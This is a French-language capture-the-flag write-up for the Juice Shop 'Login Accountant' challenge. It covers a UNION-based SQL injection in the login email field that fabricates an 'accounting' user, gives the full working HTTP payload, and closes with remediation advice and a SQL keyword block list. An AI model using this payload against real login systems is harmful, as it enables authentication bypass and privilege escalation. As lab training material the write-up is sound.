# Login Accountant

> **Category :** Injection  
> **Difficulty :** 3  

## Methodology

1. **Recherche de faille**
   - Technique : Test d'injection
   - Outil : BurpSuite (Proxy, Interceptor)
   - Description : Interception de la requête de connexion et test de vulnérabilité SQL avec `chris@juice-sh.op'` pour vérifier si le champ email est injectable.

2. **Exploitation de la faille**
   - Technique : Injection SQL (UNION-based avec injection de données fabriquées)
   - Outil : BurpSuite (Repeater)
   - Description : Injection d'une requête UNION SELECT pour créer un utilisateur fictif avec le rôle "accounting" directement dans le résultat de la requête. L'application authentifie ensuite cet utilisateur fabriqué comme s'il existait réellement en base.

| Partie | Rôle |
|--------|------|
| `accountant@juice-sh.op'` | Email quelconque suivi d'une apostrophe pour fermer la chaîne |
| `UNION SELECT * FROM (SELECT ... )` | Injecte un enregistrement utilisateur complet fabriqué |
| `32 as 'id'` | ID fictif de l'utilisateur |
| `'accounting' as 'role'` | Définit le rôle avec privilèges comptables |
| `1 as 'isActive'` | Marque le compte comme actif |
| `--` | Commente le reste de la requête originale |

## Vulnerabilities

**Vulnerability :** Injection SQL - Injection d'enregistrement utilisateur / Escalade de privilèges

**Components :** Système d'authentification, Base de données

**Severity level :** Élevé

## Risks

- Escalade de privilèges (l'attaquant peut s'attribuer n'importe quel rôle : admin, accounting, etc.)
- Contournement complet de l'authentification sans compte valide
- Falsification de session (contrôle total des données de session : username, ID, rôle)
- Accès à des fonctionnalités restreintes (comptabilité, administration)

## Actions

**Risks mitigation strategies :**
- Vérifier que l'utilisateur existe réellement en base avant d'authentifier
- Implémenter une validation stricte du format email (regex)
- Ne pas faire confiance aveuglément à la structure du résultat SQL

**Remediation fixes :**
Utiliser des requêtes paramétrées et un ORM :
```javascript
const query = "SELECT * FROM Users WHERE email = ? AND password = ?";
db.get(query, [req.body.email, hashPassword(req.body.password)], (err, user) => {
    if (err || !user) return res.status(401).json({ error: "Invalid credentials" });
    // Vérification supplémentaire que user.id existe bien en base
});
```

**Security practice :**
- Utiliser un ORM (Object-Relational Mapping) correctement configuré
- Rejeter les entrées contenant des caractères SQL (`'`, `UNION`, `--`, `SELECT`)
- Journaliser les tentatives de connexion suspectes
- Implémenter un rate limiting sur l'endpoint de login

## Evidences and artifacts

**Request :**
```http
POST /rest/user/login HTTP/2
Host: ctf.juice.cyber.epitest.eu
Content-Type: application/json

{
    "email":"accountant@juice-sh.op' UNION SELECT * FROM (SELECT 32 as 'id', 'Escroc' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', 'passe' as 'password', 'accounting' as 'role', '' as deluxeToken, '123.456.789' as 'lastLoginIp', 'assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '2000-01-01 00:00:00.000 +00:00' as 'createdAt', NULL as 'updatedAt', NULL as 'deletedAt')--",
    "password":"passw"
}
```